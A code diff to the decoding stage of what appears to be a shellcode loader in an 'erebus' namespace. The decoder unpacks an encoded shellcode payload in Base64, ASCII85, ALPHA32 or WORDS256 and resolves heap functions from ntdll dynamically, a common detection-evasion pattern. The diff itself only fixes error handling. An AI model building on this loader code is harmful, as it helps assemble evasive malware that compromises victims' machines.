@@ -236,39 +236,43 @@ namespace erebus {
 		return 0;
 	}
 
-	BOOL DecodeBase64(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
-	{
-		SIZE_T OutputCapacity = (InputLen / 4) * 3 + 3;
-		HMODULE ntdll = ImportModule("ntdll.dll");
-		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
-		BYTE* DecodedData = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, OutputCapacity);
-		SIZE_T DecodedLen = 0;
-		SIZE_T PaddingCount = 0;
+BOOL DecodeBase64(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
+{
+    SIZE_T OutputCapacity = (InputLen / 4) * 3 + 3;
 
-		if (Input[InputLen - 1] == '=') PaddingCount++;
-		if (Input[InputLen - 2] == '=') PaddingCount++;
+    HMODULE ntdll = ImportModule("ntdll.dll");
+    if (!ntdll) return FALSE; 
+    ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
+    if (!RtlAllocateHeap) return FALSE; 
+    BYTE* DecodedData = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, OutputCapacity);
+    if (!DecodedData) return FALSE;
 
-		for (SIZE_T i = 0; i < InputLen; i += 4)
-		{
-			BYTE b1 = DecodeBASE64Char(Input[i]);
-			BYTE b2 = DecodeBASE64Char(Input[i + 1]);
-			BYTE b3 = (i + 2 < InputLen && Input[i + 2] != '=') ? DecodeBASE64Char(Input[i + 2]) : 0;
-			BYTE b4 = (i + 3 < InputLen && Input[i + 3] != '=') ? DecodeBASE64Char(Input[i + 3]) : 0;
+    SIZE_T DecodedLen = 0;
 
-			DecodedData[DecodedLen++] = (b1 << 2) | (b2 >> 4);
+    for (SIZE_T i = 0; i < InputLen; i += 4)
+    {
+        // Decode the quad
+        BYTE b1 = DecodeBASE64Char(Input[i]);
+        BYTE b2 = DecodeBASE64Char(Input[i + 1]);
+        // Handle padding immediately during fetch
+        BYTE b3 = (i + 2 < InputLen && Input[i + 2] != '=') ? DecodeBASE64Char(Input[i + 2]) : 0;
+        BYTE b4 = (i + 3 < InputLen && Input[i + 3] != '=') ? DecodeBASE64Char(Input[i + 3]) : 0;
 
-			if (i + 2 < InputLen && Input[i + 2] != '=')
-				DecodedData[DecodedLen++] = ((b2 & 0x0F) << 4) | (b3 >> 2);
+        DecodedData[DecodedLen++] = (b1 << 2) | (b2 >> 4);
 
-			if (i + 3 < InputLen && Input[i + 3] != '=')
-				DecodedData[DecodedLen++] = ((b3 & 0x03) << 6) | b4;
-		}
+        if (i + 2 < InputLen && Input[i + 2] != '=')
+            DecodedData[DecodedLen++] = ((b2 & 0x0F) << 4) | (b3 >> 2);
 
-		DecodedLen -= PaddingCount;
-		*Output = DecodedData;
-		*OutputLen = DecodedLen;
-		return TRUE;
-	}
+        // Byte 3: Only write if 4th char was not padding
+        if (i + 3 < InputLen && Input[i + 3] != '=')
+            DecodedData[DecodedLen++] = ((b3 & 0x03) << 6) | b4;
+    }
+
+    *Output = DecodedData;
+    *OutputLen = DecodedLen;
+
+    return TRUE;
+}
 
 	BOOL DecodeASCII85(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 	{
@@ -442,45 +446,46 @@ namespace erebus {
 		}
 	}
 
-VOID AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
+BOOL AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
 {
     LOG_INFO("Decoding shellcode...");
+    
+    int current_config = (int)CONFIG_ENCODING_TYPE;
 
-    switch (CONFIG_ENCODING_TYPE)
+    switch (current_config)
     {
-    case FORMAT_BASE64:
+    case (int)FORMAT_BASE64:
         LOG_SUCCESS("Decoding Base64");
-        DecodeBase64(Input, InputLen, Output, OutputLen);
-        break;
+        return DecodeBase64(Input, InputLen, Output, OutputLen);
 
-    case FORMAT_ASCII85:
+    case (int)FORMAT_ASCII85:
         LOG_SUCCESS("Decoding ASCII85");
-        DecodeASCII85(Input, InputLen, Output, OutputLen);
-        break;
+        return DecodeASCII85(Input, InputLen, Output, OutputLen);
 
-    case FORMAT_ALPHA32:
+    case (int)FORMAT_ALPHA32:
         LOG_SUCCESS("Decoding ALPHA32");
-        DecodeALPHA32(Input, InputLen, Output, OutputLen);
-        break;
+        return DecodeALPHA32(Input, InputLen, Output, OutputLen);
 
-    case FORMAT_WORDS256:
+    case (int)FORMAT_WORDS256:
         LOG_SUCCESS("Decoding WORDS256");
-        DecodeWORDS256(Input, InputLen, Output, OutputLen);
-        break;
+        return DecodeWORDS256(Input, InputLen, Output, OutputLen);
 
     default:
-        LOG_INFO("No encoding configured (CONFIG_ENCODING_TYPE = 0), returning raw input");
+        LOG_INFO("No encoding configured or mismatch (Config=%d), returning raw input", current_config);
+        
         HMODULE ntdll = ImportModule("ntdll.dll");
+        if (!ntdll) return FALSE;
         ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
+        if (!RtlAllocateHeap) return FALSE;
         *Output = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, InputLen);
 
         if (*Output) {
             RtlCopyMemory(*Output, Input, InputLen);
             *OutputLen = InputLen;
+            return TRUE;
         }
-        break;
+        return FALSE;
     }
-
 }
 
 	// ============================================================
